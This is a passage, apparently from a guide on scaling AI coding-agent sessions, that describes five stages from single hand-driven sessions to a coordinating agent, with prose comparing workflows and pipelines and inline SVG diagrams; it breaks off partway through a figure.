Teams reach the factory in five stages, and the stage you are on tells you what breaks next. At stage 1, one person drives one session by hand, and that person's attention is the bottleneck. At stage 2, the person opens more sessions, explains the project again in each one, and becomes the only link between them. Stage 3 adds memory so that sessions start warm, and a dashboard to track them. It also adds scheduled sessions that start without a human, and workflows that chain the steps of one job. One person can then run many more sessions but still reads every update. Stage 4 replaces the workflows with a pipeline. Stage 5 hands the chores of running sessions to a coordinating agent. The step from stage 2 to stage 3 is the one that pays. Its cheapest form is one file in the repository that every session reads, holding the conventions and the corrections you keep repeating.

<div class="figure">
<svg viewBox="0 0 912 232" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="f1-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="f1-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="f1-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="f1-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="f1-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="f1-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<text x="0.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="700">FIVE STAGES, ONE PERSON: ONLY THE SESSION COUNT CHANGES</text>
<line x1="56" y1="176.0" x2="540" y2="176.0" stroke="#dfe1e6" stroke-width="1"/>
<text x="50.0" y="179.0" font-size="8.5" fill="#6b7a90" text-anchor="end" font-weight="normal">1</text>
<line x1="56" y1="108.0" x2="540" y2="108.0" stroke="#dfe1e6" stroke-width="1"/>
<text x="50.0" y="111.0" font-size="8.5" fill="#6b7a90" text-anchor="end" font-weight="normal">10</text>
<line x1="56" y1="40.0" x2="540" y2="40.0" stroke="#dfe1e6" stroke-width="1"/>
<text x="50.0" y="43.0" font-size="8.5" fill="#6b7a90" text-anchor="end" font-weight="normal">100</text>
<text x="50.0" y="28.0" font-size="8.5" fill="#6b7a90" text-anchor="end" font-weight="normal">sessions</text>
<rect x="70.0" y="176.0" width="76.0" height="0.0" rx="3" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<rect x="70.0" y="176.0" width="76.0" height="3.0" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="108.0" y="170.0" font-size="10" fill="#1a1a2e" text-anchor="middle" font-weight="700">1</text>
<text x="108.0" y="192.0" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="700">1 One session</text>
<text x="108.0" y="204.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">by hand</text>
<rect x="166.0" y="128.5" width="76.0" height="47.5" rx="3" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<rect x="166.0" y="128.5" width="76.0" height="27.1" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="204.0" y="122.5" font-size="10" fill="#1a1a2e" text-anchor="middle" font-weight="700">a few</text>
<text x="204.0" y="192.0" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="700">2 Many tabs</text>
<text x="204.0" y="204.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">by hand</text>
<rect x="262.0" y="87.5" width="76.0" height="88.5" rx="3" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<rect x="262.0" y="87.5" width="76.0" height="20.5" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="300.0" y="81.5" font-size="10" fill="#1a1a2e" text-anchor="middle" font-weight="700">10 to 20</text>
<text x="300.0" y="192.0" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="700">3 Memory</text>
<text x="300.0" y="204.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">and schedules</text>
<rect x="358.0" y="60.5" width="76.0" height="115.5" rx="3" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<rect x="358.0" y="60.5" width="76.0" height="27.1" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="396.0" y="54.5" font-size="10" fill="#1a1a2e" text-anchor="middle" font-weight="700">20 to 50</text>
<text x="396.0" y="192.0" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="700">4 Pipeline</text>
<text x="396.0" y="204.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">joined by queues</text>
<rect x="454.0" y="40.0" width="76.0" height="136.0" rx="3" fill="#e6f0ff" stroke="#b3d4ff" stroke-width="1.2"/>
<rect x="454.0" y="40.0" width="76.0" height="20.5" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="492.0" y="34.0" font-size="10" fill="#1a1a2e" text-anchor="middle" font-weight="700">50 and more</text>
<text x="492.0" y="192.0" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="700">5 Coordinator</text>
<text x="492.0" y="204.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">agent runs the duties</text>
<path d="M224 118 C232 100 244 94 258 94" fill="none" stroke="#FF9900" stroke-width="1.6" marker-end="url(#f1-o)"/>
<text x="186.0" y="104.0" font-size="9" fill="#9a5b00" text-anchor="end" font-weight="700">the step that pays</text>
<text x="748.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="700">FIVE DUTIES OF EVERY SESSION</text>
<path d="M787.0 56.4 A104.0 60.0 0 0 1 827.7 73.4" fill="none" stroke="#8a96a8" stroke-width="1.5" marker-end="url(#f1-g)"/>
<path d="M851.7 116.2 A104.0 60.0 0 0 1 836.2 143.8" fill="none" stroke="#8a96a8" stroke-width="1.5" marker-end="url(#f1-g)"/>
<path d="M773.2 170.2 A104.0 60.0 0 0 1 722.8 170.2" fill="none" stroke="#8a96a8" stroke-width="1.5" marker-end="url(#f1-g)"/>
<path d="M659.8 143.8 A104.0 60.0 0 0 1 644.3 116.2" fill="none" stroke="#8a96a8" stroke-width="1.5" marker-end="url(#f1-g)"/>
<path d="M668.3 73.4 A104.0 60.0 0 0 1 709.0 56.4" fill="none" stroke="#8a96a8" stroke-width="1.5" marker-end="url(#f1-g)"/>
<rect x="694.0" y="41.0" width="108.0" height="22.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="748.0" y="55.2" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">define the goal</text>
<rect x="792.9" y="82.5" width="108.0" height="22.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="846.9" y="96.7" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">start it</text>
<rect x="755.1" y="149.5" width="108.0" height="22.0" rx="5" fill="#FF9900" stroke="#FF9900" stroke-width="1.2"/>
<text x="809.1" y="163.8" font-size="9" fill="#232F3E" text-anchor="middle" font-weight="600">watch it</text>
<rect x="632.9" y="149.5" width="108.0" height="22.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="686.9" y="163.8" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">judge the result</text>
<rect x="595.1" y="82.5" width="108.0" height="22.0" rx="5" fill="#ffffff" stroke="#dfe1e6" stroke-width="1.2"/>
<text x="649.1" y="96.7" font-size="9" fill="#1a1a2e" text-anchor="middle" font-weight="600">decide what is next</text>
<circle cx="748" cy="112" r="24" fill="#232F3E"/>
<text x="748.0" y="111.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">one</text>
<text x="748.0" y="122.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">session</text>
<text x="748.0" y="208.0" font-size="9" fill="#6b7a90" text-anchor="middle" font-weight="normal">At 50 sessions these duties are a full-time job.</text>
<text x="748.0" y="222.0" font-size="9" fill="#9a5b00" text-anchor="middle" font-weight="700">Automate first the one that eats your day.</text>
</svg>
</div>

The line between stage 3 and stage 4 is the difference between a workflow and a pipeline. In a workflow, step three waits for step two. In a pipeline, stages such as triage, implement, review, and merge each run their own sessions and share nothing but a queue. Each stage takes the next item the moment it lands, so every stage stays busy without knowing anything about the others. Build a pipeline before you build an orchestrator. Labels on the issues in a tracker make an adequate queue, with one session type per label. A pipeline keeps one limit: its shape is fixed. When a result invalidates the plan, a human revises the plan and redirects the affected work.

<div class="figure">
<svg viewBox="0 0 912 196" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="f2-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="f2-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="f2-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="f2-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="f2-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="f2-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<text x="0.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="700">WORKFLOW: STEP THREE WAITS FOR STEP TWO</text>
<text x="0.0" y="39.0" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="600">Triage</text>
<rect x="72.0" y="24.0" width="330.0" height="22.0" rx="3" fill="#f1f3f6" stroke="none" stroke-width="1.2"/>
<rect x="73.0" y="26.0" width="28.0" height="18.0" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="87.0" y="39.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">A</text>
<rect x="223.0" y="26.0" width="28.0" height="18.0" rx="3" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="237.0" y="39.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">B</text>
<rect x="373.0" y="26.0" width="28.0" height="18.0" rx="3" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<text x="387.0" y="39.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">C</text>
<text x="0.0" y="67.0" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="600">Build</text>
<rect x="72.0" y="52.0" width="330.0" height="22.0" rx="3" fill="#f1f3f6" stroke="none" stroke-width="1.2"/>
<rect x="103.0" y="54.0" width="58.0" height="18.0" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="132.0" y="67.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">A</text>
<rect x="253.0" y="54.0" width="58.0" height="18.0" rx="3" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="282.0" y="67.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">B</text>
<text x="0.0" y="95.0" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="600">Verify</text>
<rect x="72.0" y="80.0" width="330.0" height="22.0" rx="3" fill="#f1f3f6" stroke="none" stroke-width="1.2"/>
<rect x="163.0" y="82.0" width="28.0" height="18.0" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="177.0" y="95.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">A</text>
<rect x="313.0" y="82.0" width="28.0" height="18.0" rx="3" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="327.0" y="95.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">B</text>
<text x="0.0" y="123.0" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="600">Merge</text>
<rect x="72.0" y="108.0" width="330.0" height="22.0" rx="3" fill="#f1f3f6" stroke="none" stroke-width="1.2"/>
<rect x="193.0" y="110.0" width="28.0" height="18.0" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="207.0" y="123.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">A</text>
<rect x="343.0" y="110.0" width="28.0" height="18.0" rx="3" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="357.0" y="123.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">B</text>
<line x1="72.0" y1="136" x2="72.0" y2="140" stroke="#8a96a8"/>
<line x1="102.0" y1="136" x2="102.0" y2="140" stroke="#8a96a8"/>
<line x1="132.0" y1="136" x2="132.0" y2="140" stroke="#8a96a8"/>
<line x1="162.0" y1="136" x2="162.0" y2="140" stroke="#8a96a8"/>
<line x1="192.0" y1="136" x2="192.0" y2="140" stroke="#8a96a8"/>
<line x1="222.0" y1="136" x2="222.0" y2="140" stroke="#8a96a8"/>
<line x1="252.0" y1="136" x2="252.0" y2="140" stroke="#8a96a8"/>
<line x1="282.0" y1="136" x2="282.0" y2="140" stroke="#8a96a8"/>
<line x1="312.0" y1="136" x2="312.0" y2="140" stroke="#8a96a8"/>
<line x1="342.0" y1="136" x2="342.0" y2="140" stroke="#8a96a8"/>
<line x1="372.0" y1="136" x2="372.0" y2="140" stroke="#8a96a8"/>
<line x1="402.0" y1="136" x2="402.0" y2="140" stroke="#8a96a8"/>
<text x="72.0" y="150.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">0</text>
<text x="402.0" y="150.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">11</text>
<text x="237.0" y="150.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">time</text>
<text x="237.0" y="168.0" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="700">2 jobs finished in 11 time units</text>
<text x="470.0" y="12.0" font-size="8.5" fill="#6b7a90" text-anchor="start" font-weight="700">PIPELINE: STAGES SHARE ONLY A QUEUE</text>
<text x="470.0" y="39.0" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="600">Triage</text>
<rect x="542.0" y="24.0" width="330.0" height="22.0" rx="3" fill="#f1f3f6" stroke="none" stroke-width="1.2"/>
<rect x="543.0" y="26.0" width="28.0" height="18.0" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="557.0" y="39.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">A</text>
<rect x="573.0" y="26.0" width="28.0" height="18.0" rx="3" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="587.0" y="39.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">B</text>
<rect x="603.0" y="26.0" width="28.0" height="18.0" rx="3" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<text x="617.0" y="39.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">C</text>
<rect x="633.0" y="26.0" width="28.0" height="18.0" rx="3" fill="#6941c6" stroke="none" stroke-width="1.2"/>
<text x="647.0" y="39.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">D</text>
<rect x="663.0" y="26.0" width="28.0" height="18.0" rx="3" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<text x="677.0" y="39.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">E</text>
<text x="470.0" y="67.0" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="600">Build</text>
<rect x="542.0" y="52.0" width="330.0" height="22.0" rx="3" fill="#f1f3f6" stroke="none" stroke-width="1.2"/>
<rect x="573.0" y="54.0" width="58.0" height="18.0" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="602.0" y="67.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">A</text>
<rect x="633.0" y="54.0" width="58.0" height="18.0" rx="3" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="662.0" y="67.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">B</text>
<rect x="693.0" y="54.0" width="58.0" height="18.0" rx="3" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<text x="722.0" y="67.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">C</text>
<rect x="753.0" y="54.0" width="58.0" height="18.0" rx="3" fill="#6941c6" stroke="none" stroke-width="1.2"/>
<text x="782.0" y="67.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">D</text>
<rect x="813.0" y="54.0" width="58.0" height="18.0" rx="3" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<text x="842.0" y="67.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">E</text>
<text x="470.0" y="95.0" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="600">Verify</text>
<rect x="542.0" y="80.0" width="330.0" height="22.0" rx="3" fill="#f1f3f6" stroke="none" stroke-width="1.2"/>
<rect x="633.0" y="82.0" width="28.0" height="18.0" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="647.0" y="95.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">A</text>
<rect x="693.0" y="82.0" width="28.0" height="18.0" rx="3" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="707.0" y="95.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">B</text>
<rect x="753.0" y="82.0" width="28.0" height="18.0" rx="3" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<text x="767.0" y="95.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">C</text>
<rect x="813.0" y="82.0" width="28.0" height="18.0" rx="3" fill="#6941c6" stroke="none" stroke-width="1.2"/>
<text x="827.0" y="95.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">D</text>
<text x="470.0" y="123.0" font-size="9.5" fill="#44546f" text-anchor="start" font-weight="600">Merge</text>
<rect x="542.0" y="108.0" width="330.0" height="22.0" rx="3" fill="#f1f3f6" stroke="none" stroke-width="1.2"/>
<rect x="663.0" y="110.0" width="28.0" height="18.0" rx="3" fill="#0052CC" stroke="none" stroke-width="1.2"/>
<text x="677.0" y="123.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">A</text>
<rect x="723.0" y="110.0" width="28.0" height="18.0" rx="3" fill="#FF9900" stroke="none" stroke-width="1.2"/>
<text x="737.0" y="123.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">B</text>
<rect x="783.0" y="110.0" width="28.0" height="18.0" rx="3" fill="#1e7e34" stroke="none" stroke-width="1.2"/>
<text x="797.0" y="123.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">C</text>
<rect x="843.0" y="110.0" width="28.0" height="18.0" rx="3" fill="#6941c6" stroke="none" stroke-width="1.2"/>
<text x="857.0" y="123.0" font-size="9" fill="#ffffff" text-anchor="middle" font-weight="700">D</text>
<line x1="542.0" y1="136" x2="542.0" y2="140" stroke="#8a96a8"/>
<line x1="572.0" y1="136" x2="572.0" y2="140" stroke="#8a96a8"/>
<line x1="602.0" y1="136" x2="602.0" y2="140" stroke="#8a96a8"/>
<line x1="632.0" y1="136" x2="632.0" y2="140" stroke="#8a96a8"/>
<line x1="662.0" y1="136" x2="662.0" y2="140" stroke="#8a96a8"/>
<line x1="692.0" y1="136" x2="692.0" y2="140" stroke="#8a96a8"/>
<line x1="722.0" y1="136" x2="722.0" y2="140" stroke="#8a96a8"/>
<line x1="752.0" y1="136" x2="752.0" y2="140" stroke="#8a96a8"/>
<line x1="782.0" y1="136" x2="782.0" y2="140" stroke="#8a96a8"/>
<line x1="812.0" y1="136" x2="812.0" y2="140" stroke="#8a96a8"/>
<line x1="842.0" y1="136" x2="842.0" y2="140" stroke="#8a96a8"/>
<line x1="872.0" y1="136" x2="872.0" y2="140" stroke="#8a96a8"/>
<text x="542.0" y="150.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">0</text>
<text x="872.0" y="150.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">11</text>
<text x="707.0" y="150.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">time</text>
<text x="707.0" y="168.0" font-size="9.5" fill="#1a1a2e" text-anchor="middle" font-weight="700">4 jobs finished in 11 time units, every stage busy</text>
<text x="456.0" y="188.0" font-size="8.5" fill="#6b7a90" text-anchor="middle" font-weight="normal">Illustrative schedule. Triage, review, and merge take one unit, and implement takes two.</text>
</svg>
</div>

A mature factory runs stages from outcome definition through specification, implementation, review, testing, deployment, and incident response. It routes each change by risk class, so a documentation fix and a payments change do not travel the same path. The enabling investment is colocating documentation with source, and orchestration comes second. This is section 6.2 applied to an organization. Once every stage can read the knowledge it needs beside the code, the bottleneck moves to CI/CD throughput. Agents open changes faster than a pipeline sized for a team of humans can build and test them. The fast feedback loop from section 10 stops being about agent iteration and becomes a capacity planning problem.

<div class="figure">
<svg viewBox="0 0 912 330" xmlns="http://www.w3.org/2000/svg" role="img">
<defs><marker id="f3-g" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#8a96a8"/></marker><marker id="f3-o" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#FF9900"/></marker><marker id="f3-b" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#0052CC"/></marker><marker id="f3-r" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#de350b"/></marker><marker id="f3-gr" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#1e7e34"/></marker><marker id="f3-d" viewBox="0 0 10 10" refX="8.5" refY="5" markerWidth="6.5" markerHeight="6.5" orient="auto-start-reverse"><path d="M0,0 L10,5 L0,10 z" fill="#232F3E"/></marker></defs>
<rect x="0.0" y="4.0" width="912.0" height="26.0" rx="13" fill="#232F3E" stroke="none" stroke-width="1.2"/>
<text x="456.0" y="21.0" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Coordinating agent: creates, seeds, watches, and closes sessions, and re-plans when a result changes the plan</text>
<polygon points="0.0,50.0 126.3,50.0 136.3,64.0 126.3,78.0 0.0,78.0" fill="#232F3E"/>
<text x="68.1" y="67.6" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Plan</text>
<polygon points="129.3,50.0 255.6,50.0 265.6,64.0 255.6,78.0 129.3,78.0 139.3,64.0" fill="#232F3E"/>
<text x="202.4" y="67.6" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Specify</text>
<polygon points="258.6,50.0 384.9,50.0 394.9,64.0 384.9,78.0 258.6,78.0 268.6,64.0" fill="#232F3E"/>
<text x="331.7" y="67.6" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Build</text>
<polygon points="387.9,50.0 514.1,50.0 524.1,64.0 514.1,78.0 387.9,78.0 397.9,64.0" fill="#232F3E"/>
<text x="461.0" y="67.6" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Test</text>
<polygon points="517.1,50.0 643.4,50.0 653.4,64.0 643.4,78.0 517.1,78.0 527.1,64.0" fill="#232F3E"/>
<text x="590.3" y="67.6" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Verify</text>
<polygon points="646.4,50.0 772.7,50.0 782.7,64.0 772.7,78.0 646.4,78.0 656.4,64.0" fill="#232F3E"/>
<text x="719.6" y="67.6" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Deploy</text>
<polygon points="775.7,50.0 902.0,50.0 912.0,64.0 902.0,78.0 775.7,78.0 785.7,64.0" fill="#232F3E"/>
<text x="848.9" y="67.6" font-size="10" fill="#ffffff" text-anchor="middle" font-weight="600">Operate</text>
<line x1="68.1" y1="31" x2="68.1" y2="48" stroke="#8a96a8" stroke-width="1" stroke-dasharray="3 3"/>
<line x1="202.4" y1="31" x2="202.4" y2="48" stroke="#8a96a8" stroke-width="1" stroke-dasharray="3 3"/>
<line x1="331.7" y1="31" x2="331.7" y2="48" stroke="#8a96a8" stroke-width="1" stroke-dasharray="3 3"/>
<line x1="461.0" y1="31" x2="461.0" y2="48" stroke="#8a96a8" stroke-width="1" stroke-dasharray="3 3"/>
<line x1="590.3" y1="31" x2="590.3" y2="48" stroke="#8a96a8" stroke-width="1" stroke-dasharray="3 3"/>
<line x1="719.6" y1="31" x2="719.6" y2="48" stroke="#8a96a8" stroke-width="1" stroke-dasharray="3 3"/>
<line x1="848.9" y1="31" x2="848.9" y2="48" stroke="#8a96a8" stroke-width="1" stroke-dasharray="3 3"/>
<circle cx="68.1" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="68.1" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="189.4" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="189.4" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="215.4" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="215.4" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="318.7" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="318.7" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="344.7" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="344.7" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="318.7" cy="128.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="318.7" cy="128.0" r="4" fill="#232F3E"/>
<circle cx="344.7" cy="128.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="344.7" cy="128.0" r="4" fill="#232F3E"/>
<circle cx="448.0" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="448.0" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="474.0" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="474.0" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="461.0" cy="128.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="461.0" cy="128.0" r="4" fill="#232F3E"/>
<circle cx="577.3" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="577.3" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="603.3" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="603.3" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="590.3" cy="128.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="590.3" cy="128.0" r="4" fill="#232F3E"/>
<circle cx="719.6" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="719.6" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="835.9" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="835.9" cy="102.0" r="4" fill="#232F3E"/>
<circle cx="861.9" cy="102.0" r="10" fill="#e6f0ff" stroke="#0052CC" stroke-width="1.6"/>
<circle cx="861.9" cy="102.0" r="4" fill="#232F3E"/>
<rect x="128.3" y="104.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="128.3" y="110.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="128.3" y="116.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="262.6" y="104.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="262.6" y="110.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="262.6" y="116.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="391.9" y="104.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="391.9" y="110.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
<rect x="391.9" y="116.0" width="14.0" height="4.0" rx="1" fill="#8a96a8" stroke="none" stroke-width="1.2"/>
